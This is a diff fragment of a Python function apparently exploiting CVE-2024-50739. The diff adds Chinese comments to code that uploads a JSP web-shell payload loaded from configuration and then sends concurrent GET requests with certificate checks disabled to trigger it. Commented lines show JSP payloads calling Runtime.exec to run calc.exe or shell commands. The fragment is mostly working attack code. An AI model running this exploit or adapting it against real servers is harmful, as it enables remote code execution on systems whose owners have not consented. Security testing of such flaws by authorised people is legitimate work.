@@ -46,8 +46,13 @@ def check_cve_2024_50739(url, config):
         # payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"
         # Process process = Runtime.getRuntime().exec(new String[]{" /bin/sh -c ls /usr/local"});
         # payload_put = "aa<% Runtime.getRuntime().exec(\"bin/sh -c ls -al /usr \");%>"
+        # 从配置字典中获取名为 'shell_file_content' 的文件内容
+        # 如果该键不存在，则使用默认的 shell 内容作为后备值
         shell_file_content = config['files'].get('shell_file_content', '<%-- 默认的 shell 内容 --%>')
+
+        # 将获取到的shell文件内容赋值给变量 payload_put，以便后续使用
         payload_put = shell_file_content
+
 
         # 增加线程
         # 使用ThreadPoolExecutor来并发执行多个请求
@@ -64,7 +69,9 @@ def check_cve_2024_50739(url, config):
                 futures.append(executor.submit(requests.get, target_url_get1, verify=False, headers=headers2))
                 futures.append(executor.submit(requests.get, target_url_get2, verify=False, headers=headers2))
 
+
             # 使用concurrent.futures.as_completed函数监控futures集合中的所有future对象完成情况
+            # 遍历并发执行的future对象
             for future in concurrent.futures.as_completed(futures):
                 try:
                     # 获取future对象的结果
